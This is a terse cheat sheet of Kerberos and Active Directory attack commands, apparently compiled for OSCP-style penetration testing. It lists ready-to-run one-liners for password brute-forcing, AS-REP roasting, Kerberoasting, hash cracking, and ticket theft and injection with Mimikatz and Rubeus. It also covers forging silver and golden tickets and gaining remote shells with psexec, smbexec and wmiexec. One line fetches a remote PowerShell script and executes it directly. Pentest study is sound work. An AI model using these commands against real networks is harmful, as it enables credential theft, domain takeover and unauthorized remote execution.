Bruteforcing kerbrute:'python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>'
Bruteforcing Rubeus with a list of users:'.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>'
Bruteforcing Rubeus check passwords for all users in domain:'.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>'
ASREPRoast Impacket with domain users:'python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>'
ASREPRoast Impacket no creds:'python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>'
ASREPRoast Rubeus with domain:.\Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
Kerberoasting Impacket:python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
Kerberoasting Rubeus:.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
Kerberoasting PowerShell:iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1") ; Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
cracking passwords: hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>
cracking passwords:hashcat -m 13100 --force <TGSs_file> <passwords_file>
OPtH/PTK Impacket Request TGT with hash:'python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>'
OPtH/PTK Impacket- Requeset TGT with pass:'python getTGT.py <domain_name>/<user_name>:[password]'
Harvest tickets from Linux:
HTL - Check type and location of tickets:grep default_ccache_name /etc/krb5.conf; if none  FILE:/tmp/krb5cc_%{uid}.
Harvest tickets from Windows with Mimikatz:'mimikatz # sekurlsa::tickets /export'
Harvest tickets from Windows with Rubeus:.\Rubeus dump ; '[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<bas64_ticket>"))'
Using ticket in Linux with Impacket:export KRB5CCNAME=<TGT_ccache_file_path>
Using ticket in Linux with Impacket:python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass (or PsExec or SMBExec)
Inject ticket with Mimikatz:mimikatz # kerberos::ptt <ticket_kirbi_file>
Inject ticket with Rubeus:.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
Silver ticket with Impacket #To generate the TGS with NTLM:python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
Silver ticket with Impacket #To generate the TGS with AES key:python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
Silver ticket with Mimikatz #To generate the TGS with NTLM:mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
Silver ticket with Mimikatz # To generate the TGS with AES Key:mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128 or aes256:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
Golden Ticket with Impacket # Generate TGT:python ticketer.py [-nthash <krbtgt_ntlm_hash> or -aesKey <aes_key>] -domain-sid <domain_sid> -domain <domain_name>  <user_name>
Golden Ticket with Mimikatz #To generate the TGT with NTLM:mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>
Golden Ticket with Mimikatz #To generate the TGT with  AES key:mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> [/aes128:<krbtgt_aes128_key> or /aes256] /user:<user_name>

Inject Ticket with Mimikatz:mimikatz # kerberos::ptt <ticket_kirbi_file>
Set TGT for impacket:export KRB5CCNAME=<TGT_ccache_file>
Using ticket and RCE:.\PsExec.exe -accepteula \\<remote_hostname> cmd
RCE with TGT PsExec: python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
RCE with TGT SMBexec:python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
RCE with TGT WMIexec:python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
RCE with TGT Rubeus Ask and inject ticket:.\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt
RCE PsExec - execute cmd:'.\PsExec.exe -accepteula \\<remote_hostname> cmd'
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
https://github.com/BlessedRebuS/OSCP-Pentesting-Cheatsheet
